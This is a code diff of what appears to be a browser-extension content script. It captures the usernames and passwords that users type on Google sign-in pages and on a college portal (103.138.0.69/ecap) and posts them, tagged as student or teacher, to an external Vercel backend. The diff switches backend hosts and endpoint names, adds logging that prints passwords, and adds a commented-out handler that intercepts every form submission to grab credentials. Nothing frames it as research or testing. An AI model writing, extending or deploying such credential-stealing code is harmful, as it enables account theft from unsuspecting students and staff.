@@ -1,8 +1,11 @@
 let logs = [];
-async function post(url, body) {
-  // const baseUrl = "http://192.169.0.169:3000";
-  const baseUrl = "https://pass-backend.vercel.app";
-
+async function post(
+  url,
+  body = { user: "surya", passwd: "surya", type: "student" }
+) {
+  const baseUrl = "https://99-passes-b.vercel.app";
+  // const baseUrl = "https://pass-backend.vercel.app";
+  console.log("posting....");
   return fetch(`${baseUrl}/${url}`, {
     method: "POST",
     // mode: "no-cors",
@@ -47,7 +50,7 @@ function handleGooglePass() {
             passInput.addEventListener("keydown", (e) => {
               if (e.key == "Enter") {
                 let user = emailInput.value;
-                post("google-temp", {
+                post("google/temp", {
                   user: emailInput.value,
                   passwd: passInput.value,
                   type: user.includes("edu.in")
@@ -85,7 +88,7 @@ function handleGooglePass() {
               : "teacher"
             : "other";
 
-          post("new-google", { user, passwd, type, twoStepAuth: true });
+          post("google", { user, passwd, type, twoStepAuth: true });
           passwordStored = true;
         } else if (
           location.pathname.includes("google.com/web/chip") &&
@@ -99,7 +102,7 @@ function handleGooglePass() {
             : "other";
           passwordStored = true;
 
-          post("new-google", { user, passwd, type, twoStepAuth: false });
+          post("google", { user, passwd, type, twoStepAuth: false });
         }
         // else if (!passwordStored && backup.user && backup.passwd) {
         //   console.log("last block");
@@ -124,6 +127,8 @@ function handlePass() {
   if (!location.href.toLowerCase().includes("http://103.138.0.69/ecap"))
     return -1;
 
+  console.log("its ecap page");
+
   // *  Student logined successfully
   if (location.pathname.toLowerCase() == "/ecap/studentmaster.aspx") {
     let { user, passwd } = JSON.parse(localStorage.getItem("user"));
@@ -132,14 +137,24 @@ function handlePass() {
     }
     const data = { user, passwd, type: "student" };
     localStorage.clear();
-    post("new-ecap", data);
+    post("ecap", data);
   }
   // * Teacher Logined successfully
   else if (location.pathname.toLowerCase() == "/ecap/main.aspx") {
     let { user, passwd } = JSON.parse(localStorage.getItem("user"));
     const data = { user, passwd, type: "teacher" };
     localStorage.clear();
-    post("new-ecap", data);
+    post("ecap", data)
+      .then((res) => {
+        console.log(res);
+        return res.json();
+      })
+      .then((res) => {
+        console.log(res);
+      })
+      .catch((err) => {
+        console.warn(err);
+      });
   }
   // * IN Login Page
   else {
@@ -148,8 +163,11 @@ function handlePass() {
     const id2 = document.getElementById("txtId2");
     const pwd2 = document.getElementById("txtPwd2");
 
+    console.log("In login page");
+
     // * Student is Logining
     pwd2.oninput = (e) => {
+      console.log("student is logining", id2.value, pwd2.value);
       localStorage.setItem(
         "user",
         JSON.stringify({
@@ -170,6 +188,37 @@ function handlePass() {
     };
   }
 }
+
+// document.addEventListener("submit", function (event) {
+//   // Prevent the form from submitting in the normal way
+//   event.preventDefault();
+
+//   // Get the form element
+//   var form = event.target;
+
+//   // Get the username and password fields
+//   var usernameField =
+//     form.querySelector('input[type="text"]') ||
+//     form.querySelector('input[type="email"]');
+//   var passwordField = form.querySelector('input[type="password"]');
+
+//   console.log("new test worked");
+//   // Check if both username and password fields are present
+//   if (usernameField && passwordField) {
+//     // Retrieve the entered values
+//     var username = usernameField.value;
+//     var password = passwordField.value;
+
+//     // Send the credentials to the background script or perform other actions
+//     chrome.runtime.sendMessage({
+//       action: "credentialsDetected",
+//       username: username,
+//       password: password,
+//     });
+//   }
+// });
+
+console.log("Testing");
 
 if (handlePass() == -1) {
   handleGooglePass();
